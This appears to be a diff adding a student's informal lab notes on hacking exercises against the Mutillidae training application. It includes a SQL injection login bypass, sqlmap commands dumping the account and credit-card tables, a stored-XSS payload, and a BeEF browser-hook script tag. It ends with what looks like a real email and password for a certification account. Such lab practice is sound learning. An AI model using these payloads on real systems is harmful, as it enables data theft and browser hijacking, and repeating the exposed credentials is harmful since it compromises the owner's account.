@@ -1,0 +1,81 @@
+task 1: learning , doing the top 3/4 most used hacking techniques:
+1. sql injection
+2. xss attack
+3. mitm
+
+task 2: running: linux , mysql , apache , php:
+cd /
+cd 
+
+
+sudo ./manager-linux-x64.run
+
+open edge
+ http://192.168.108.162/mutilllidae/src/index.php
+ note: own ip address
+
+username = robert
+username = ' or 1=1 -- -  ( sql injection code )
+
+task 3:sqlmapping attack:
+ gamit ang isang username ( admin  , adminpass )
+ using kali(securecrt)
+ sqlmap --url="http://192.168.108.162/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --current-db
+
+
+sqlmap --url="http://192.168.108.162/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts --dump
+
+*shows tables
+ sqlmap --url="http://192.168.108.162/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --tables
+ note: click No 
+
+*shows credit cards
+sqlmap --url="http://192.168.108.162/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
+
+
+
+task4: Cross site scripting attack xxs:
+cookies:
+
+cookies path:
+c:\users\
+
+2kinds of XSS attack.
+type1: reflected: your javascript is executed
+type2: store XSS: your JS is stored on the server and Hooked!
+
+*copy and paste this to blog
+<h1>Hello WOrld try ko XSS attack</h1>
+<script>alert("xss attack, here we come, haha")</script>
+
+beef: browser exploitation framework:
+ cd beef
+  ls
+  ./beef
+  *highlist the URL hook and do the script below
+
+*copy and paste this to blog
+<script src="http://192.168.108.162:3000/hook.js"></script>
+
+ *copy the 
+  http://192.168.108.162:3000/ui/panel
+  open new tab and paste it.
+  beefpass
+  beefpass
+
+
+attack no. 3: Buffer Overflow
+ may occur when the input is too large to fit inside the space allocated.
+
+
+comptia account login
+email: mike.vinculado12252908@gmail.com 
+pw - 9n3R2|"z!ON[
+
+
+
+
+
+
+
+
